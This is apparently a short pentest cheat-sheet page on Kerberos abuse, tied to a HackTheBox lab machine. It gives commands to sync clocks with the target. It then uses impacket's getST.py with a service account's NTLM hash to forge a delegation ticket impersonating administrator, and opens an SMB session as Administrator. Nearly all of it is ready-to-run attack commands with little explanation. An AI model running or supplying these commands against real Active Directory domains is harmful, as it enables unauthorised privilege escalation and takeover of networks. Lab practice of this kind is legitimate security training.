---
title: Kerberos_Abuse
permalink: /Windows_PE/Kerberos
---


## To synchronize time with machine (necessary to abuse kerberos)

### On host
```VBoxManage setextradata "Kali-Linux-2021.4a-virtualbox-amd64" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1```

## On guest
```timedatectl set-ntp 1```  
```sudo ntpdate -u $IP_BOX```

# You get a ticket  
```python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate administrator```  
```export KRB5CCNAME=administrator.ccache```  
```impacket-smbclient Administrator@dc.intelligence.htb -k -no-pass```
